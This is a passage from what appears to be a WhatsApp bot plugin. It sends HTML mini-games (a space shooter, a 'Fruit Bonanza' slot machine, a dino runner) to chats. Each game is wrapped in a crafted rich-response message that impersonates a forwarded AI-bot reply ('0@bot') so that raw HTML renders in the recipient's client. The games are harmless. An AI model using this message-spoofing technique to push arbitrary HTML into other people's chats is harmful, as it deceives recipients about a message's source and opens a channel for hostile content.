    ctx.fillStyle = '#06b6d4';
    ctx.beginPath();
    ctx.ellipse(0, -6, 3.5, 9, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = '#ffffff';
    ctx.beginPath();
    ctx.ellipse(-1, -8, 1, 3, Math.PI / 4, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();
  }
  function drawMeteor(x, y, size) {
    ctx.save();
    ctx.translate(x, y);
    ctx.fillStyle = '#78350f';
    ctx.strokeStyle = '#451a03';
    ctx.lineWidth = 2;
    ctx.beginPath();
    var points = 7;
    for (var i = 0; i < points; i++) {
      var angle = (i / points) * Math.PI * 2;
      var r = size / 2 + ((i % 2 === 0) ? 3 : -3);
      var px = Math.cos(angle) * r;
      var py = Math.sin(angle) * r;
      if (i === 0) ctx.moveTo(px, py); else ctx.lineTo(px, py);
    }
    ctx.closePath();
    ctx.fill();
    ctx.stroke();
    ctx.restore();
  }
  function drawAlien(x, y) {
    ctx.save();
    ctx.translate(x, y);
    ctx.fillStyle = '#10b981';
    ctx.beginPath();
    ctx.arc(0, 0, 12, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = '#059669';
    ctx.fillRect(-14, 2, 28, 5);
    ctx.fillStyle = '#ffffff';
    ctx.fillRect(-5, -4, 4, 4);
    ctx.fillRect(1, -4, 4, 4);
    ctx.restore();
  }
  var spawnCounter = 0;
  function update() {
    ctx.save();
    if (shake > 0) {
      var sx = (Math.random() - 0.5) * shake;
      var sy = (Math.random() - 0.5) * shake;
      ctx.translate(sx, sy);
      shake *= 0.88;
      if (shake < 0.5) shake = 0;
    }
    ctx.clearRect(-10, -10, W + 20, H + 20);
    ctx.fillStyle = '#ffffff';
    for (var s = 0; s < stars.length; s++) {
      var st = stars[s];
      if (!gameOver) st.y = (st.y + st.speed) % H;
      ctx.globalAlpha = Math.random() * 0.5 + 0.5;
      ctx.fillRect(st.x, st.y, st.size, st.size);
    }
    ctx.globalAlpha = 1;
    if (!gameOver) {
      playerX += (targetX - playerX) * 0.25;
      shootTimer++;
      if (shootTimer >= 10) {
        bullets.push({ x: playerX - 12, y: playerY - 10, speed: 8 });
        bullets.push({ x: playerX + 12, y: playerY - 10, speed: 8 });
        shootTimer = 0;
      }
      spawnCounter++;
      if (spawnCounter > 35) {
        spawnEnemy();
        spawnCounter = 0;
      }
      if (comboTimer > 0) comboTimer--; else if (combo > 1) combo = 1;
    }
    ctx.fillStyle = '#38bdf8';
    for (var b = bullets.length - 1; b >= 0; b--) {
      var bl = bullets[b];
      if (!gameOver) bl.y -= bl.speed;
      ctx.fillRect(bl.x - 1.5, bl.y, 3, 10);
      if (bl.y < -10) bullets.splice(b, 1);
    }
    for (var e = enemies.length - 1; e >= 0; e--) {
      var en = enemies[e];
      if (!gameOver) en.y += en.speed;
      if (en.isMeteor) {
        drawMeteor(en.x, en.y, en.w);
      } else {
        drawAlien(en.x, en.y);
      }
      for (var b = bullets.length - 1; b >= 0; b--) {
        var bl = bullets[b];
        if (Math.abs(bl.x - en.x) < en.w / 2 + 2 && Math.abs(bl.y - en.y) < en.h / 2 + 5) {
          bullets.splice(b, 1);
          en.hp--;
          explode(bl.x, bl.y, en.isMeteor ? '#78350f' : '#10b981', 6);
          if (en.hp <= 0) {
            kills++;
            score += 50 * combo;
            combo = Math.min(combo + 1, 9);
            comboTimer = 90;
            coins.push({ x: en.x, y: en.y, r: 8, spin: 0 });
            explode(en.x, en.y, '#10b981', 15);
            enemies.splice(e, 1);
            break;
          }
        }
      }
      if (!en) continue;
      if (!gameOver && Math.abs(playerX - en.x) < 22 && Math.abs(playerY - en.y) < 22) {
        gameOver = true;
        shake = 12;
        flashAlpha = 0.5;
        explode(playerX, playerY, '#3b82f6', 25);
        explode(en.x, en.y, en.isMeteor ? '#78350f' : '#10b981', 25);
      }
      if (en.y > H + 40) enemies.splice(e, 1);
    }
    for (var c = coins.length - 1; c >= 0; c--) {
      var cn = coins[c];
      if (!gameOver) { cn.y += 2.5; cn.spin += 0.15; }
      var squash = Math.abs(Math.cos(cn.spin));
      ctx.save();
      ctx.translate(cn.x, cn.y);
      ctx.scale(Math.max(0.2, squash), 1);
      ctx.fillStyle = '#fbbf24';
      ctx.beginPath();
      ctx.arc(0, 0, cn.r, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();
      if (!gameOver && Math.abs(playerX - cn.x) < 20 && Math.abs(playerY - cn.y) < 20) {
        coinCount++;
        score += 30;
        explode(cn.x, cn.y, '#fbbf24', 8);
        coins.splice(c, 1);
      } else if (cn.y > H + 20) {
        coins.splice(c, 1);
      }
    }
    if (!gameOver) {
      drawSpaceCraft(playerX, playerY);
    }
    for (var p = particles.length - 1; p >= 0; p--) {
      var pt = particles[p];
      pt.x += pt.vx;
      pt.y += pt.vy;
      pt.life -= 0.05;
      if (pt.life <= 0) { particles.splice(p, 1); continue; }
      ctx.globalAlpha = Math.max(pt.life, 0);
      ctx.fillStyle = pt.color;
      ctx.beginPath();
      ctx.arc(pt.x, pt.y, pt.size, 0, Math.PI * 2);
      ctx.fill();
      ctx.globalAlpha = 1;
    }
    if (flashAlpha > 0.01) {
      ctx.fillStyle = 'rgba(255,255,255,' + flashAlpha + ')';
      ctx.fillRect(0, 0, W, H);
      flashAlpha *= 0.85;
    }
    scoreEl.textContent = String(score).padStart(4, '0');
    if (score > best) {
      best = score;
      try { localStorage.setItem('plane_best_v1', String(best)); } catch(e){}
      bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
    }
    killsStatEl.textContent = kills;
    comboStatEl.textContent = 'x' + combo;
    coinsStatEl.textContent = coinCount;
    if (gameOver) {
      ctx.fillStyle = 'rgba(7, 10, 18, 0.85)';
      ctx.fillRect(0, 0, W, H);
      ctx.textAlign = 'center';
      ctx.fillStyle = '#ef4444';
      ctx.font = '900 24px sans-serif';
      ctx.fillText('DESTROYED 💥', W / 2, H / 2 - 25);
      ctx.fillStyle = '#ffffff';
      ctx.font = '800 14px sans-serif';
      ctx.fillText('Score: ' + score, W / 2, H / 2 - 2);
      ctx.fillStyle = '#94a3b8';
      ctx.font = '600 11px sans-serif';
      ctx.fillText('Kills: ' + kills + '  •  Coins: ' + coinCount, W / 2, H / 2 + 18);
      ctx.fillStyle = '#38bdf8';
      ctx.font = '700 12px sans-serif';
      ctx.fillText('TAP TO RESTART', W / 2, H / 2 + 42);
    }
    ctx.restore();
    requestAnimationFrame(update);
  }
  function moveLeft() {
    if (gameOver) return;
    if (currentLane > 0) currentLane--;
    targetX = lanes[currentLane];
  }
  function moveRight() {
    if (gameOver) return;
    if (currentLane < lanes.length - 1) currentLane++;
    targetX = lanes[currentLane];
  }
  function restart() {
    score = 0;
    kills = 0;
    coinCount = 0;
    combo = 1;
    comboTimer = 0;
    bullets = [];
    enemies = [];
    coins = [];
    particles = [];
    currentLane = 1;
    targetX = lanes[currentLane];
    playerX = lanes[currentLane];
    gameOver = false;
  }
  function addTapEvent(id, fn) {
    var el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('pointerdown', function(e) { e.preventDefault(); fn(); });
  }
  addTapEvent('leftBtn', moveLeft);
  addTapEvent('rightBtn', moveRight);
  function handleCanvasTap(e) {
    e.preventDefault();
    if (gameOver) { restart(); return; }
    var rect = cvs.getBoundingClientRect();
    var clientX = e.clientX;
    if (e.touches && e.touches.length > 0) clientX = e.touches[0].clientX;
    var clickX = (clientX - rect.left) * (W / rect.width);
    if (clickX < W / 2) moveLeft(); else moveRight();
  }
  cvs.addEventListener('pointerdown', handleCanvasTap);
  update();
})();
</script>
</body>
</html>
`

    const data = {
      response_id: "PopiooNixelPopiooNixelPopiooNixel",
      sections: [
        {
          __typename: "GenAIUnifiedResponseSection",
          view_model: {
            __typename: "GenAISingleLayoutViewModel",
            primitive: {
              __typename: "GenAIBotProgressStatusPrimitive",
              title: "KLIK TEKS INI",
              is_in_progress: true
            }
          }
        }
      ],
      embedded_screens: [
        {
          title: "Preview",
          content: [
            {
              __typename: "FOAIDNixelButtonSheets",
              tabs: [
                {
                  id: "tab_0",
                  tab_header: "MISTER-MD",
                  sections: [
                    {
                      __typename: "GenAIUnifiedResponseSection",
                      view_model: {
                        __typename: "GenAISingleLayoutViewModel",
                        primitive: {
                          __typename: "GenAIaeacdsnwHtmlPrimitive",
                          payload: html,
                          url: "https://example.com",
                          trusted_sources: ["example.com"]
                        }
                      }
                    }
                  ],
                  step_entries: []
                }
              ]
            }
          ]
        }
      ]
    };

    await client.relayMessage(
      m.chat,
      {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          botMetadata: {
            messageDisclaimerText: "",
            richResponseSourcesMetadata: {}
          }
        },
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              unifiedResponse: {
                data: Buffer.from(JSON.stringify(data)).toString('base64')
              },
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
                forwardOrigin: 4
              }
            }
          }
        }
      },
      {
        messageId: await client.generateMessageTag()
      }
    )
  }
  break

  case "slot777": {
    const html = `<style>
*{box-sizing:border-box;margin:0;font-family:'Segoe UI',Arial,sans-serif;user-select:none;-webkit-user-select:none;-webkit-tap-highlight-color:transparent}
html,body{width:100%}
body{background:radial-gradient(circle at 50% 8%,#1d6a50,#0f4938 48%,#07291f);padding:9px;color:#e9e3bc;overflow-y:auto}
.machine{width:100%;max-width:420px;margin:0 auto;position:relative;padding:10px 12px 12px;border:4px solid #b9954d;border-radius:26px;background:linear-gradient(110deg,#061e17,#1b644b 12%,#0b382a 30%,#15543f 55%,#092f24 80%,#28775a 94%,#071f18);box-shadow:inset 0 0 0 3px #163f31,inset 0 16px 26px #73d2a31f,0 8px 0 #041a13,0 16px 24px #000c}
.lights{height:9px;margin:0 12px 7px;border:2px solid #123d2f;border-radius:8px;background:repeating-radial-gradient(circle at 6px 50%,#dfffdc 0 2px,#82c878 3px 5px,#164936 6px 12px);box-shadow:0 0 12px #67b881;animation:blink .55s steps(2) infinite}
.title{padding:10px 4px 8px;border:3px solid #b99a54;border-radius:16px 16px 11px 11px;color:#e9e3bc;background:radial-gradient(ellipse at 50% 0,#2b8a6c,#11513f 60%,#082a24);text-align:center;font:900 25px Impact,'Arial Black',sans-serif;letter-spacing:1px;text-shadow:0 3px #193f31,0 0 12px #7ddc8a66}
.jack{width:76%;margin:6px auto;padding:3px;border:2px solid #a98c4d;border-radius:9px;color:#ded7ad;background:linear-gradient(#245d48,#0b3025);text-align:center;font:bold 10px monospace;letter-spacing:1px}
.stats{display:flex;margin:0 2px 8px;padding:5px;border:2px solid #537d64;border-radius:9px;background:linear-gradient(#102d24,#061812);box-shadow:inset 0 0 9px #000}
.stats div{flex:1;border-right:1px solid #416452;text-align:center;font:bold 10px monospace;color:#91b59f}
.stats div:last-child{border:0}
.stats b{display:block;margin-top:2px;font-size:15px;color:#e3dfbb;text-shadow:0 0 6px #62a77d}
.frame{padding:8px;border:4px solid #315c47;border-radius:16px;background:linear-gradient(90deg,#09271e,#b49a59 5%,#174936 10%,#174936 90%,#b49a59 95%,#09271e);box-shadow:inset 0 0 0 3px #071b15,0 4px 0 #09271e,0 8px 15px #000a}
#reels{display:grid;grid-template-columns:repeat(5,1fr);height:192px;overflow:hidden;border:3px solid #071c15;border-radius:10px;background:#071a14;box-shadow:inset 0 12px 18px #0009,inset 0 -12px 18px #0009}
.reel{position:relative;overflow:hidden;background:linear-gradient(90deg,#8f6a39,#fff8d8 17%,#fffdf0 50%,#f0dfad 82%,#79552c);box-shadow:inset 7px 0 8px #573b1d55,inset -7px 0 8px #573b1d55}
.reel+.reel{border-left:2px solid #573512}
.reel:after{content:"";position:absolute;inset:0;pointer-events:none;background:linear-gradient(#1c0d05bb 0,transparent 18%,transparent 80%,#281208cc 100%)}
.strip{will-change:transform}
.strip.moving{filter:blur(1.4px) saturate(1.2)}
.sym{height:64px;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #9f7e4f44;font-family:'Apple Color Emoji','Segoe UI Emoji',sans-serif;font-size:40px;line-height:1;text-shadow:0 3px 0 #72101822,0 0 4px #fff}
.s7{font:900 42px Impact,'Arial Black',sans-serif;color:#ef1726;-webkit-text-stroke:2px #850815;text-shadow:0 3px #5d0509,0 0 5px #fff}
.sbar{width:52px;height:22px;display:flex;align-items:center;justify-content:center;font:900 12px 'Arial Black',sans-serif;color:#fff4c4;background:radial-gradient(ellipse at center,#e22d35 0,#6f0910 55%,transparent 56%);text-shadow:0 2px #401010}
.win{animation:winP .5s ease-in-out infinite;background:radial-gradient(circle,#fff8a9,#ffae00 55%,transparent 72%)}
@keyframes winP{50%{transform:scale(1.09);filter:brightness(1.4)}}
.message{height:34px;margin:9px 2px 7px;display:flex;align-items:center;justify-content:center;border:2px solid #537d64;border-radius:8px;background:linear-gradient(#102d24,#061812);box-shadow:inset 0 0 8px #000;color:#e3dfbb;font:bold 14px monospace;text-shadow:0 0 7px #62a77d;text-align:center}
.console{display:grid;grid-template-columns:46px 1fr 1.8fr;gap:8px;margin:0 3px;padding:9px 8px 11px;border:3px solid #416a53;border-radius:9px 9px 16px 16px;background:linear-gradient(#9c8c59,#315d48 37%,#0a2e22 39%,#123e2f);box-shadow:inset 0 2px #d9c992,0 6px #061d16,0 12px 18px #0009}
button{height:53px;border:3px solid #0b2e22;border-radius:13px;color:#fff;font-weight:900;cursor:pointer;touch-action:manipulation}
.mute{background:linear-gradient(#d9b04a,#8a6d08 55%,#5d4805);box-shadow:0 4px #3d2f02;font-size:18px}
.bet{background:linear-gradient(#4f9a77,#216348 53%,#103d2d);box-shadow:inset 0 4px 4px #d8ffe055,0 4px #092a20}
.spin{background:radial-gradient(circle at 50% 32%,#a8d96f,#4b8d46 47%,#1e542f 76%);box-shadow:inset 0 4px 5px #e8ffd488,0 4px #12351e,0 0 14px #79b85c88;font-size:18px;text-shadow:0 2px #06420d}
button:disabled{filter:saturate(.4) brightness(.75)}
.tray{width:48%;height:17px;margin:13px auto 0;border:4px solid #244d3a;border-radius:4px 4px 10px 10px;background:#061a13;box-shadow:inset 0 6px 9px #000,0 3px #897945}
.winner .lights{animation-duration:.16s}
.winner .title{animation:winP .6s ease-in-out 2}
.over{position:absolute;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:7px;border-radius:20px;background:#03150eec;color:#ffe5a0;text-align:center}
.over.off{display:none}
.over h2{margin:0 0 6px;font-size:24px;color:#ff3449;text-shadow:0 0 12px #f00}
.over p{font-size:13px;color:#cfe6c8}
.over button{padding:0 22px;height:40px;background:#ffd15a;color:#271204}
@keyframes blink{50%{filter:brightness(1.7)}}
</style>
<div class="machine" id="machine">
<div class="lights"></div>
<div class="title">FRUIT BONANZA</div>
<div class="jack">JACKPOT · 10.000 CREDITS</div>
<div class="stats"><div>CREDITS<b id="credits">500</b></div><div>BET<b id="betValue">10</b></div><div>BEST WIN<b id="best">0</b></div></div>
<div class="frame"><div id="reels"></div></div>
<div id="message" class="message">SPIN UNTUK MULAI</div>
<div class="console"><button id="mute" class="mute">🔊</button><button id="bet" class="bet">BET +</button><button id="spin" class="spin">🎰 SPIN</button></div>
<div class="tray"></div>
<div id="over" class="over off"><h2>GAME OVER</h2><p>Credits habis!<br>Best Win: <b id="finalBest">0</b></p><button id="restart">MAIN LAGI</button></div>
</div>
<script>
(function(){
var AC=null,MUTED=false;
try{MUTED=localStorage.getItem('slot_mute')==='1'}catch(e){}
function ac(){if(!AC){try{AC=new(window.AudioContext||window.webkitAudioContext)()}catch(e){return null}}if(AC.state==='suspended'){try{AC.resume()}catch(e){}}return AC;}
function tone(f,dur,type,vol,delay,slide){var a=ac();if(!a||MUTED)return;try{var t=a.currentTime+(delay||0),o=a.createOscillator(),g=a.createGain();o.type=type||'square';o.frequency.setValueAtTime(f,t);if(slide)o.frequency.exponentialRampToValueAtTime(slide,t+dur);g.gain.setValueAtTime(vol||.12,t);g.gain.exponentialRampToValueAtTime(.0001,t+dur);o.connect(g);g.connect(a.destination);o.start(t);o.stop(t+dur+.03);}catch(e){}}
function sndClick(){tone(650,.05,'square',.08)}
function sndSpin(){tone(700,.28,'sawtooth',.06,0,150);for(var i=0;i<8;i++)tone(170,.03,'square',.05,.1+i*.1)}
function sndStop(c){tone(150+c*35,.09,'square',.16)}
function sndWin(){[660,880,1100].forEach(function(f,i){tone(f,.14,'triangle',.14,i*.09)})}
function sndJackpot(){[523,659,784,1046,784,1046,1318,1568].forEach(function(f,i){tone(f,.16,'square',.12,i*.11);tone(f/2,.16,'triangle',.08,i*.11)})}
function sndLose(){tone(220,.2,'sawtooth',.07);tone(160,.3,'sawtooth',.07,.14)}
function sndOver(){[392,330,262,196].forEach(function(f,i){tone(f,.3,'triangle',.12,i*.28)})}
document.addEventListener('pointerdown',function(){ac()},{once:true});
var SY=['🍒','🍋','🔔','💎','7','BAR'],WT=[30,25,18,12,8,7],PAY=[2,3,5,8,12,20],SH=64,LEN=10,OFF=7,credits=500,bet=10,best=0,busy=false,reels=[],C=document.getElementById('credits'),BV=document.getElementById('betValue'),BS=document.getElementById('best'),MSG=document.getElementById('message'),SP=document.getElementById('spin'),BT=document.getElementById('bet'),MUB=document.getElementById('mute'),OV=document.getElementById('over'),FB=document.getElementById('finalBest'),MCH=document.getElementById('machine');
function pick(){var n=Math.random()*100,s=0;for(var i=0;i<6;i++){s+=WT[i];if(n<s)return i}return 0}
function symHTML(v){return '<div class="sym">'+(v===4?'<i class="s7">7</i>':v===5?'<i class="sbar">BAR</i>':SY[v])+'</div>'}
function ui(){C.textContent=credits;BV.textContent=bet;BS.textContent=best}
function msg(t){MSG.textContent=t}
function clearWin(){for(var c=0;c<5;c++)for(var i=OFF;i<LEN;i++)reels[c].strip.children[i].classList.remove('win')}
function spin(){if(busy||credits<bet)return;busy=true;clearWin();credits-=bet;ui();SP.disabled=true;BT.disabled=true;msg('GOOD LUCK ✨');sndSpin();for(var c=0;c<5;c++){var r=reels[c],vals=[],h='';for(var i=0;i<LEN;i++)vals.push(pick());for(var j=0;j<LEN;j++)h+=symHTML(vals[j]);r.vals=vals;r.strip.innerHTML=h;r.strip.style.transition='none';r.strip.style.transform='translateY(0)';r.strip.offsetHeight;var dur=1.05+c*0.22;r.strip.classList.add('moving');r.strip.style.transition='transform '+dur+'s cubic-bezier(.12,.75,.25,1)';r.strip.style.transform='translateY(-'+(OFF*SH)+'px)';(function(st,d,ix){setTimeout(function(){st.classList.remove('moving');sndStop(ix)},d*1000)})(r.strip,dur,c)}setTimeout(evalBoard,2150)}
function evalBoard(){var grid=[];for(var c=0;c<5;c++)grid.push(reels[c].vals.slice(OFF));var lines=[[0,0,0,0,0],[1,1,1,1,1],[2,2,2,2,2],[0,1,2,1,0],[2,1,0,1,2]],total=0,wc=[];lines.forEach(function(p){var a=grid[0][p[0]],n=1;for(var x=1;x<5&&grid[x][p[x]]===a;x++)n++;if(n>=3){total+=Math.floor(bet*PAY[a]*(n===3?1:n===4?2:5));for(var i=0;i<n;i++)wc.push([i,p[i]])}});if(total){credits+=total;best=Math.max(best,total);wc.forEach(function(w){reels[w[0]].strip.children[OFF+w[1]].classList.add('win')});msg(total>=bet*20?'🎰 JACKPOT +'+total:'✨ MENANG +'+total);MCH.classList.add('winner');setTimeout(function(){MCH.classList.remove('winner')},1800);if(total>=bet*20)sndJackpot();else sndWin()}else{msg('💦 BELUM HOKI!');sndLose()}SP.disabled=false;BT.disabled=false;busy=false;ui();if(credits<10)setTimeout(gameover,900);else if(bet>credits){bet=10;ui()}}
function gameover(){FB.textContent=best;OV.className='over';sndOver()}
BT.onclick=function(){if(busy)return;sndClick();bet=bet===10?20:bet===20?50:10;if(bet>credits)bet=10;ui()};SP.onclick=spin;MUB.onclick=function(){MUTED=!MUTED;MUB.textContent=MUTED?'🔇':'🔊';try{localStorage.setItem('slot_mute',MUTED?'1':'0')}catch(e){}if(!MUTED)sndClick()};if(MUTED)MUB.textContent='🔇';
document.getElementById('restart').onclick=function(){sndClick();credits=500;bet=10;best=0;busy=false;OV.className='over off';msg('SPIN UNTUK MULAI');SP.disabled=false;BT.disabled=false;clearWin();ui()};
var box=document.getElementById('reels');for(var c=0;c<5;c++){var d=document.createElement('div');d.className='reel';var s=document.createElement('div');s.className='strip';d.appendChild(s);box.appendChild(d);var h='';for(var i=0;i<LEN;i++)h+=symHTML(pick());s.innerHTML=h;s.style.transform='translateY(-'+(OFF*SH)+'px)';reels.push({strip:s,vals:[0,0,0]})}ui();
})();
\n/* RIMURU LIGHT SFX: procedural WebAudio, no external audio asset */
(function(){
  if (window.__RIMURU_LIGHT_SFX__) return;
  var ac=null, master=null, last=0;
  function init(){
    try{
      if(!ac){
        var C=window.AudioContext||window.webkitAudioContext;
        if(!C) return null;
        ac=new C();
        master=ac.createGain();
        master.gain.value=0.055;
        master.connect(ac.destination);
      }
      if(ac.state==='suspended') ac.resume();
      return ac;
    }catch(_){ return null; }
  }
  function tone(freq,dur,type,vol,when){
    var c=init(); if(!c||!master) return;
    var now=c.currentTime+(when||0), o=c.createOscillator(), g=c.createGain();
    o.type=type||'sine';
    o.frequency.setValueAtTime(freq,now);
    g.gain.setValueAtTime(0.0001,now);
    g.gain.exponentialRampToValueAtTime(Math.max(0.0001,vol||0.12),now+0.008);
    g.gain.exponentialRampToValueAtTime(0.0001,now+(dur||0.07));
    o.connect(g); g.connect(master); o.start(now); o.stop(now+(dur||0.07)+0.015);
  }
  function cool(now){
    var t=Date.now(); if(t-last<now) return false; last=t; return true;
  }
  var api={
    init:init,
    tap:function(){ if(cool(28)) tone(520,0.045,'square',0.055); },
    move:function(){ if(cool(24)) tone(300,0.035,'triangle',0.045); },
    rotate:function(){ if(cool(24)) tone(430,0.05,'triangle',0.05); },
    drop:function(){ if(cool(20)) tone(180,0.055,'square',0.05); },
    score:function(){ if(cool(18)) { tone(660,0.055,'sine',0.055); tone(880,0.055,'sine',0.04,0.045); } },
    line:function(){ if(cool(35)) { tone(740,0.06,'sine',0.06); tone(1040,0.09,'sine',0.045,0.05); } },
    win:function(){ if(cool(60)) { tone(523,0.08,'sine',0.06); tone(659,0.08,'sine',0.05,0.07); tone(784,0.12,'sine',0.045,0.14); } },
    over:function(){ if(cool(60)) { tone(392,0.09,'sawtooth',0.055); tone(294,0.12,'sawtooth',0.04,0.08); } }
  };
  window.__RIMURU_LIGHT_SFX__=api;

  function num(el){
    var s=(el.textContent||'').replace(/,/g,'').match(/-?\d+(?:\.\d+)?/);
    return s?Number(s[0]):null;
  }
  function bindValue(el){
    var lastVal=num(el);
    var mo=new MutationObserver(function(){
      var n=num(el);
      if(n===null || lastVal===null){ lastVal=n; return; }
      if(n>lastVal){
        var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
        if(/line|combo|clear|level|stage/.test(id)) api.line(); else api.score();
      } else if(n<lastVal && /life|hp|health|lives|heart/.test(((el.id||'')+' '+(el.className||'')).toLowerCase())) api.over();
      lastVal=n;
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true});
  }
  function bindState(el){
    var prev=(el.textContent||'').toLowerCase(), prevCls=el.className||'';
    var mo=new MutationObserver(function(){
      var txt=(el.textContent||'').toLowerCase(), cls=el.className||'';
      var joined=txt+' '+cls.toLowerCase();
      if(joined!==prev+' '+prevCls.toLowerCase()){
        if(/game over|gameover|kalah|selesai|you lose|lose|mati|gagal|over/.test(joined)) api.over();
        else if(/menang|menang!|you win|winner|victory|berhasil|selamat/.test(joined)) api.win();
        prev=txt; prevCls=cls;
      }
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true,attributes:true,attributeFilter:['class','style','hidden','aria-hidden']});
  }
  document.addEventListener('pointerdown',function(){ api.init(); api.tap(); },{passive:true,capture:true});
  document.addEventListener('keydown',function(e){
    api.init();
    var k=e.key;
    if(/^Arrow(Left|Right|Up|Down)$/.test(k) || /^(a|d|w|s)$/i.test(k)) api.move();
    else if(k===' ' || k==='Enter') api.tap();
  },{passive:true,capture:true});
  document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  });
  if(document.readyState!=='loading'){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  }
})();
</script>`

    const data = {
      response_id: "PopiooNixelPopiooNixelPopiooNixel",
      sections: [
        {
          __typename: "GenAIUnifiedResponseSection",
          view_model: {
            __typename: "GenAISingleLayoutViewModel",
            primitive: {
              __typename: "GenAIBotProgressStatusPrimitive",
              title: "KLIK TEKS INI",
              is_in_progress: true
            }
          }
        }
      ],
      embedded_screens: [
        {
          title: "Preview",
          content: [
            {
              __typename: "FOAIDNixelButtonSheets",
              tabs: [
                {
                  id: "tab_0",
                  tab_header: "MISTER-MD",
                  sections: [
                    {
                      __typename: "GenAIUnifiedResponseSection",
                      view_model: {
                        __typename: "GenAISingleLayoutViewModel",
                        primitive: {
                          __typename: "GenAIaeacdsnwHtmlPrimitive",
                          payload: html,
                          url: "https://example.com",
                          trusted_sources: ["example.com"]
                        }
                      }
                    }
                  ],
                  step_entries: []
                }
              ]
            }
          ]
        }
      ]
    };

    await client.relayMessage(
      m.chat,
      {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          botMetadata: {
            messageDisclaimerText: "",
            richResponseSourcesMetadata: {}
          }
        },
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              unifiedResponse: {
                data: Buffer.from(JSON.stringify(data)).toString('base64')
              },
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
                forwardOrigin: 4
              }
            }
          }
        }
      },
      {
        messageId: await client.generateMessageTag()
      }
    )
  }
  break

  case "dino": {
    const html = `<style>*{-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}</style>
<body style="margin:0;background:transparent;font-family:Arial,sans-serif;color:#eee;touch-action:manipulation;cursor:pointer">
<div style="width:100%;max-width:620px;margin:auto;padding:16px;box-sizing:border-box">
<div style="background:rgba(255,255,255,.06);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border:1px solid rgba(255,255,255,.15);border-radius:16px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.35)">
<div style="padding:18px 20px;border-bottom:1px solid rgba(255,255,255,.12);display:flex;justify-content:space-between;align-items:center">
<div><div style="font-size:11px;letter-spacing:1.5px;color:rgba(255,255,255,.45)">MISTER-MD</div><div style="font-size:21px;font-weight:bold;color:#fff">Dino Runner</div></div>
<div style="text-align:right"><div id="score" style="font-size:18px;font-weight:bold;color:#fff;text-shadow:0 0 10px rgba(108,92,231,.85);transition:transform .15s">00000</div><div id="best" style="font-size:10px;color:rgba(255,255,255,.4);margin-top:2px">BEST 00000</div></div>
</div>
<div style="padding:18px">
<canvas id="game" width="560" height="190" style="width:100%;height:auto;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.12);border-radius:12px;display:block"></canvas>
<div id="status" style="text-align:center;margin-top:10px;font-size:12px;color:rgba(255,255,255,.55)">Speed 5.0x</div>
</div></div></div>
<script>
const c=document.getElementById('game'),x=c.getContext('2d'),scoreEl=document.getElementById('score'),bestEl=document.getElementById('best'),statusEl=document.getElementById('status');
const GY=170;
let d,o,clouds,particles,ambient,trail,score,best=0,speed,gameOver,last,shake,flash,runT,spawnTimer,milestone,squash;
function loadBest(){
let vals=[];
try{let v=localStorage.getItem('dino_best');if(v)vals.push(parseInt(v,10))}catch(e){}
try{let v=sessionStorage.getItem('dino_best');if(v)vals.push(parseInt(v,10))}catch(e){}
try{let m=document.cookie.match(/(?:^|;s*)dino_best=(d+)/);if(m)vals.push(parseInt(m[1],10))}catch(e){}
return vals.length?Math.max(...vals.filter(v=>!isNaN(v))):0
}
function saveBest(v){
let val=String(Math.floor(v));
try{localStorage.setItem('dino_best',val)}catch(e){}
try{sessionStorage.setItem('dino_best',val)}catch(e){}
try{document.cookie='dino_best='+val+';max-age=31536000;path=/'}catch(e){}
try{
let rq=indexedDB.open('dino_db',1);
rq.onupgradeneeded=()=>{rq.result.createObjectStore('kv')};
rq.onsuccess=()=>{try{rq.result.transaction('kv','readwrite').objectStore('kv').put(val,'dino_best')}catch(e){}}
}catch(e){}
}
function loadBestAsync(cb){
try{
let rq=indexedDB.open('dino_db',1);
rq.onupgradeneeded=()=>{rq.result.createObjectStore('kv')};
rq.onsuccess=()=>{
try{
let gr=rq.result.transaction('kv','readonly').objectStore('kv').get('dino_best');
gr.onsuccess=()=>{if(gr.result)cb(parseInt(gr.result,10))}
}catch(e){}
}
}catch(e){}
}
best=loadBest();
loadBestAsync(v=>{if(!isNaN(v)&&v>best){best=v;bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0')}});
function reset(){
d={x:55,y:132,w:27,h:30,vy:0,jumping:false};
o=[];
clouds=[{x:120,y:32,w:44,s:.35},{x:300,y:52,w:60,s:.22},{x:460,y:26,w:36,s:.4},{x:560,y:70,w:50,s:.18}];
particles=[];
trail=[];
if(!ambient){ambient=[];for(let i=0;i<18;i++)ambient.push({x:Math.random()*c.width,y:Math.random()*c.height,r:.5+Math.random()*1.5,vx:.1+Math.random()*.3,ph:Math.random()*10})}
